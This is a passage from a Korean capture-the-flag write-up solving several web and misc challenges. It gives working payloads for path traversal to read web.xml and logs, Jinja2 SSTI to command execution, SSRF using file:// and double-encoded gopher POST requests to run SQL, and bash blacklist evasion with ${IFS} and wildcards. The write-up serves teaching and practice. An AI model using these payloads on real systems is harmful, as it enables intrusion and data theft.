관리자도구로 제품스펙 버튼의 html 소스코드를 확인합니다. btnFunc()함수는 fileDownload_process.jsp 페이지로 이동하면서 파라미터로 다운받을 파일명을 전달합니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2018.png)

URL에 `fileDownload_process.jsp?filename=test` 를 입력해봅니다. “test” 파일을 찾을 수 없다는 메시지 창이 뜹니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2019.png)

여기서 filename 파라미터를 변조하여 원하는 경로로 이동하여 원하는 파일을 다운받을 수 있습니다.

- **path traversal 취약점**

이 문제에서는 filename 파라미터에 대한 필터링이 없으므로 `../` 을 이용하여 상위 디렉터리로 이동할 수 있습니다.

- **file Download 취약점**

이 웹사이트는 JSP로 개발되었고, JSP에서 서버의 설정파일은 WEB-INF/web.xml 에 보통 저장되어있습니다. 

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2020.png)

**다운받는 파일 위치** : WebContent/resources/upload/P1234.xlsx 

**web.xml 위치** : WebContent/WEB-INF/web.xml

web.xml 을 다운받으려면  `../../WEB-INF/web.xml` 이렇게 접근하면 됩니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2021.png)

web.xml 파일을 살펴보면, filter를 설정하여 로그를 기록하는 것을 알 수 있습니다.

param-value 값으로 resources\\logs\\Webaccess.log 를 지정하여 로그 파일 경로와 이름을 유추할 수 있습니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2022.png)

파일다운로드 취약점 또는 URL로 직접 접속하여 Webaccess.log 파일을 다운받을 수 있습니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2023.png)

log파일에서 webadmin_manage.jsp라는 관리자 페이지 경로를 찾을 수 있고, 해당 페이지에 접속하면 flag를 얻을 수 있습니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2024.png)

flag : ****`flag{y0ur_GrADE_1s_Real_A+}`****

## ****Jinja?(MEDIUM) - 5 Solves****

```
개발자가 문서를 작성하기 위해 서비스를 개발했는데.. Flask Framework에서 취약점이 발생한다고?

http://ssuctf.kr:5000
```

주어진 Dockerfile을 확인해보면 python flask 모듈을 이용해서 웹 서버를 구축해놓은 것을 알 수 있다.

```docker
FROM python:3.10

WORKDIR /app
RUN pip3 install flask 
COPY ./src /app/
RUN python db.py
CMD ["python", "app.py"]
```

홈페이지에 구현된 기능은 총 3가지다.

![스크린샷 2023-01-30 오전 1.20.27.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.20.27.png)

Write기능인데 제목과 내용을 작성할 수 있다.

![스크린샷 2023-01-30 오전 1.21.01.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.21.01.png)

Write로 작성한 글을 Read에서 확인할 수 있다.

![스크린샷 2023-01-30 오전 1.21.33.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.21.33.png)

Modify에서는 템플릿을 수정할 수 있다. 여기서 Jinja2 템플릿을 수정하면 그대로 Read에서 확인할 수 있다.

![스크린샷 2023-01-30 오전 1.22.02.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.22.02.png)

다만, 템플릿을 직접 수정할 수 있다는 것은 곧 취약점으로 이루어질 수 있다. `{{ 7*7 }}` 을 템플릿에 넣고 Read를 해보니 49라는 값이 나옴을 확인할 수 있다.

![스크린샷 2023-01-30 오전 1.24.47.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.24.47.png)

소스코드를 확인해보면 `render_template_string` 함수을 이용해 read하기 때문이다. 이는 SSTI(Server Side Template Injection) 취약점으로 이루어질 수 있는데, SSTI는 공격자가 Template 코드를 기존 template에 include 시켜서 원하는 액션을 수행하도록 하는 공격이다. 이 취약점으로 RCE(Retmoe Code Execution) 연결될 수 있다.

```python
@app.route('/read')
def read():
	try:
		username = session['username']
		conn = sqlite3.connect('users.db')
		c = conn.cursor()
		c.execute('SELECT * FROM document WHERE creator=?', (username,))
		rows = c.fetchall()
		c.execute('SELECT content FROM template WHERE creator=?', (username,))
		template = c.fetchone()[0]
		conn.close()
		return render_template_string(template, rows=rows)
	except:
		return redirect(url_for('index'))
```

SSTI 취약점은 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) 를 확인해서 Exploit을 하면 된다.

Exploit 방법

1. `{{''.__class__.__mro__[1].__subclasses__()}}` 에서 Popen 클래스를 찾습니다.

2. 410번째에 Popen이 있으므로 Popen(’cat flag’,shell=True,stdout=-1).communicate()[0]을 실행시켜줍시다.

3. 최종 페이로드는 `{{''.__class__.__mro__[1].__subclasses__()[410]('cat flag',shell=True,stdout=-1).communicate()[0]}}` 이다.

Modify에 다음과 같은 페이로드를 넣고 Read해서 플래그를 읽으면 된다.

![스크린샷 2023-01-30 오전 1.33.21.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.33.21.png)

flag : `flag{well_KN0wn_FLASK&JINJA2_D3velOp!}`

## dHd(HARD) - 1 Solves

```
FFRRRRRRRRRRRRRRRR-SS!!

http://ssuctf.kr:8889/
```

총 3가지 파트가 존재한다.

```
The fist part of the flag is at /flag.txt
The second part of the flag is in database, check /var/www/html/flag.php
The last part of the flag is in database
```

소스코드에 따르면 첫번째 파트는 `/flag.txt` 에 존재한다고 한다. 하지만 `/flag.txt` 에는 파일이 존재하지 않는다.

![스크린샷 2023-01-28 오후 7.33.39.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-28_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.33.39.png)

소스코드를 자세히 살펴보면 아래와 같이 `url` 파라미터를 받아서 `curl`로 접근하고 그 결과를 출력해주는 것을 확인할 수 있다.

```php
if (!isset($_GET['url'])) {
    die(highlight_file(__FILE__));
}

$url = $_GET['url'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
curl_close($ch);

echo $response;
```

`url` 에는 여러가지 `scheme`이 존재하고 `curl` 이 지원하는 것 중에선 `file:` 이라는 것이 존재한다.

해당 스킴은 `file://` 뒤에 오는 경로를 파일 시스템의 경로로 사용하여 해당 경로에 존재하는 파일을 의미한다.

따라서 `?url=file:///flag.txt` 와 같이 전달하여 플래그의 첫번째 파트를 구할 수 있다.

![스크린샷 2023-01-28 오후 7.37.06.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-28_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.37.06.png)

### 두번째 파트

소스코드에 따르면 두번째 파트는 DB에 존재하고 `/var/www/html/flag.php`를 확인하라고 한다.

```
The second part of the flag is in database, check /var/www/html/flag.php
```

첫번째 파트의 플래그를 구한 방식으로 해당 경로에 접근해보면 아래와 같다.

![스크린샷 2023-01-28 오후 7.38.56.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-28_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.38.56.png)

브라우저로 접근해서 얼핏 보면 아무것도 보이지 않는 것 같지만 개발자 도구를 통해서 보면 실제로는 PHP 소스코드가 전달된 것을 확인할 수 있다.

![스크린샷 2023-01-28 오후 7.39.27.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-28_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.39.27.png)

소스코드는 아래와 같다.

```php
<?php

if ($_SERVER['REMOTE_ADDR'] === "127.0.0.1") {
    if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['role']) && $_GET['role'] === "admin") {
        $db = mysqli_connect('db', 'dhd', '');

        $result = mysqli_query($db, "SELECT flag FROM flag.flag WHERE id=2");
        $result = mysqli_fetch_array($result);
        
        echo $result[0];
    }
    else if ($_SERVER['REQUEST_METHOD'] === "POST" && isset($_POST['role']) && isset($_POST['sql']) && $_POST['role'] === "admin") {
        $db = mysqli_connect('db', 'dhd', '');
    
        $result = mysqli_query($db, $_POST['sql']);
        $result = mysqli_fetch_array($result);
        
        echo var_dump($result);
    }
}
```

소스코드를 살펴보면 해당 경로에 `127.0.0.1` 을 IP로 갖는 클라이언트가 `GET` 메소드로 접근하였을 때 파라미터 중 `role` 이 존재하고 그 값이 `admin`이면  DB에 접근해서 데이터를 전달해주는 것을 확인할 수 있다.

이때 `127.0.0.1` 은 자기 자신을 의미하기 때문에 `url` 파라미터를 통해서 접속하여 플래그의 두번째 파트를 얻을 수 있다.

`?url=http://127.0.0.1:80/flag.php?role=admin`

![스크린샷 2023-01-28 오후 7.57.22.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-28_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.57.22.png)

### 세번째 파트

세번째 파트는 데이터베이스에 존재한다고 한다.

`flag.php` 를 살펴보면 `POST` 메소드를 통해서 `role=admin` 과 `sql=<sql query>` 형식으로 값을 전달하여 mysql db에 쿼리를 보내는 것이 가능합니다.

이 때 두번째 파트를 `flag.flag` 에서 가져왔기 때문에 `SELECT * FROM flag.flag` 등의 쿼리를 전달하여 플래그를 휙득할 수 있다는 것을 추측할 수 있습니다.

POST 요청을 보내기 위해서는 curl에서 지원하는 gopher 프로토콜을 이용해야합니다. 해당 프로토콜의 사용법은 다음과 같습니다

`gopher://IP:PORT/_<packet data>`

gopher 프로토콜은 IP:PORT에 접속하여 주어진 URL의 `path` 에서 첫번째 바이트를 무시한 후 이후에 오는 값을 packet의 raw data로 사용하여 전달합니다.

이러한 점을 이용하여 `POST` 요청을 보내는 패킷을 생성하여 보내는 방식으로 풀이가 가능합니다.

하지만 유의할 점이 존재합니다. printable하지 않은 문자와 공백 등에 대해서는 URL encoding을 적용하여 전송해야하며 `apache` 서버 접속 시에 URL decode가 이루어지는데 최초 브라우저 접속 시 1번, curl 사용 시 1번 총 2번 decode가 일어나기 때문에 URL encoding을 두 번 적용한 문자열을 통해 요청을 보내야합니다.

```
http://ssuctf.kr:8889/?url=gopher://localhost:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250aHost:%2520localhost%250d%250aContent-Length:%252051%250d%250aContent-Type:%2520application/x-www-form-urlencoded%250d%250aConnection:%2520close%250d%250a%250d%250arole=admin%2526sql=SELECT%2520%252a%2520FROM%2520flag%252eflag%2520WHERE%2520id%3C%3E2
```

![스크린샷 2023-01-31 오후 1.21.32.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-31_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_1.21.32.png)

flag : `flag{8f6d5b31a62ccdbb4190b5edf546d26b}`

# Misc(Miscellaneous)

## ****MIC CHECK - 32 Solves****

```
flag는 Discord 공지에 있습니다!

Discord Link : https://discord.gg/pwDXbn38wS
```

## ****Strings(EASY) - 21 Solves****

```
Do you know there are two flags in this image file??!?!
```

## ****Simple Bash(MEDIUM) - 11 Solves****

```
bash jail를 아십니까?

nc ssuctf.kr 1338
```

python 파일이 주어집니다.

```python
import sys
import subprocess

def write(msg):
    sys.stdout.write(msg + '\n')
    sys.stdout.flush()

def input_check(command):
    blacklist = [' ', 'cat', 'echo', 'tail', 'head', 'less', 'flag', 'strings', 'grep']
    for c in blacklist:
        if c in command:
            return True
    return False

write('Welcome To Jail Challenge')
write('[!] Read the flag.txt')
while True:
    sys.stdout.write("$ ")
    
    command = sys.stdin.readline().strip()

    if input_check(command):
        write('no hack!')
        continue
    
    if(command):
        res = subprocess.Popen("/bin/bash -c '{0}'".format(command), stdout=subprocess.PIPE,  stderr=subprocess.PIPE, shell=True)
        output, error = res.communicate()
        if error != b'':
            write("-------------- Error --------------")
            write(error.decode())
            write("------------------------------------")
            continue
        write("-------------- Output --------------")
        write(output.decode())
        write("------------------------------------")
```

주어진 서버에 접속해보면, $ 하고 입력을 받는데 우리가 입력한 Linux Command를 실행해주고 출력해준다.

돌아가고 있는 프로그램을 확인해보면 입력을 받고, `input_check` 함수의 검증을 통과하면 subprocess.Popen을 통해 bash 쉘로 입력한 명령어를 실행해줍니다. 

![스크린샷 2023-01-21 오후 8.54.42.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-21_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_8.54.42.png)

`input_check` 함수를 확인해보면 우리 입력한 command에 blacklist에 담긴 문자열들이 존재하면 안됩니다. 확인해보면 주로 출력하는 것들이 필터링 돼 있습니다.

```jsx
def input_check(command):
    blacklist = [' ', 'cat', 'echo', 'tail', 'head', 'less', 'flag', 'strings', 'grep']
    for c in blacklist:
        if c in command:
            return True
    return False
```

flag.txt를 읽어서 화면에 출력할 수 있는 명령어들을 찾아봐야합니다. `/bin` 경로에 있는 Linux Command를 읽어와 봅시다.

필터링중에 ‘ ‘ 공백도 필터링 하므로 이를 우회해야 하는데 이떄 IFS를 사용하면 우회할 수 있습니다.

Linux Manual Page([https://man7.org/linux/man-pages/man1/bash.1.html](https://man7.org/linux/man-pages/man1/bash.1.html))를 확인해보면 필드 구분자라고 정의 돼 있습니다. 기본적으로 정의된건 <space><tab><newline>입니다. 이를 이용하면 공백을 대체해서 이용할 수 있습니다. bash에서 변수값을 접근할 때 ${변수} 이렇게 접근해야 합니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2025.png)

이제 ls 명령어로 /bin파일에 존재하는 파일들을 확인하려면 `ls${IFS}/bin` 입력 하면 `ls /bin` 과 같은 역할을 합니다.

![스크린샷 2023-01-21 오후 8.54.23.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-21_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_8.54.23.png)

또 다른 공백 우회 방법은 {ls,/bin} 처럼 { } 사이에 명령어를 넣고 콤마로 구분해주면 됩니다.

![스크린샷 2023-01-21 오후 9.05.08.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-21_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_9.05.08.png)

이제 공백을 우회하는 방법을 알았으니, 화면에 출력할 때 쓸 명령어들(필터링 제외)을 찾아봐야 합니다. 

base32, base64, rev, fold, tac, nl, sort등의 출력을 사용할 수 있습니다.

![스크린샷 2023-01-21 오후 9.09.35.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-21_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_9.09.35.png)

아니면 cat, tail을 절대경로로 사용하면서 ?를 이용하면 우회할 수 있습니다.

/bin/ca?이라고 하면 /bin/cat으로 인식돼 사용할 수 있습니다.

![스크린샷 2023-01-21 오후 9.20.30.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-21_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_9.20.30.png)

이런식으로 다양한 우회 방법으로 flag를 획득할 수 있습니다.

flag : `flag{SImplE_EsC4p3!}`

## ****Face Lock(MEDIUM) - 0 Solves****

```
인공 신경망으로 얼굴 잠금을 만들었어요!

http://ssuctf.kr:56789/
```

## ****Search Everything(HARD) - 6 Solves****

```
악덕 ASC 회장님이 Brainfuck Interpreter를 제작하고, 메모리 어딘가에 플래그를 넣어두었습니다...

꼭 찾아주세요!

nc ssuctf.kr 1339
```

Brainfuck 코드를 돌릴 수 있는데, Brainfuck Interpreter 메모리 어딘가에 플래그가 숨어있다고 하니까 모든 메모리를 출력해보도록 brainfuck 코드를 짜면 된다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2026.png)

무한반복으로 ptr 출력하고 ptr++을 수행하면 된다.

무한 반복 루프를 작성하기 위해서는 [] 가 필요한데, [, ]이 루프로 작동하기 위해서는 ptr 의 값이 0이 아니여야 하기 떄문에 +로 ptr의 값을 하나 올려줘서 무한루프가 작동되도록 한다.

의사코드는 다음과 같다.

```c
+[>.+]
-------------------------
*ptr += 1
while:
	if *ptr == 0:
		return
	ptr += 1;
	print(ptr)
	*ptr += 1;
	if *ptr == 0:
		break
	else:
		continue
```

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2027.png)

flag : `flag{just_memory_search}`